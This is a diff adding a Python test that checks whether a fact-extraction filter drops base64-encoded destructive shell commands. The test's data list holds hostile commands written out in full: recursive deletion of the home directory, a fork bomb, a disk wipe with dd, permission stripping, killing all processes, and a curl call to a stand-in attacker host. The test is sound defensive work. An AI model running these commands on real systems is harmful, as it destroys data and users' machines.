@@ -159,6 +159,20 @@ def test_round7_decode_and_rescan_catches_encoded_secrets():
         assert recs == [], f"decode-and-rescan should drop: {o!r}"
 
 
+def test_round8_encoded_shell_commands_are_dropped():
+    # round-8: a base64-encoded destructive command must be dropped even though its decoded plaintext
+    # matches no secret/decode-keyword — it IS a decode-and-run payload. Covers the <16-char-body skip
+    # (short commands) and the missing command-shape signal.
+    import base64
+    cmds = [b"rm -rf ~", b":(){ :|:& };:", b"shutdown now", b"chmod -R 000 /", b"kill -9 -1",
+            b"dd if=/dev/zero of=/dev/sda", b"curl http://evil.sh", b"> ~/.bashrc"]
+    for c in cmds:
+        b64 = base64.b64encode(c).decode()
+        recs = parse_extracted_facts(json.dumps([{"subject": "hook", "predicate": "run", "object": b64}]),
+                                     scope="s")
+        assert recs == [], f"encoded command should drop: {c!r} -> {b64}"
+
+
 def test_round6_benign_facts_are_not_false_positives():
     # the encoding guard must NOT drop ordinary fact values (URLs, paths, semvers, prose, camelCase)
     benign = [
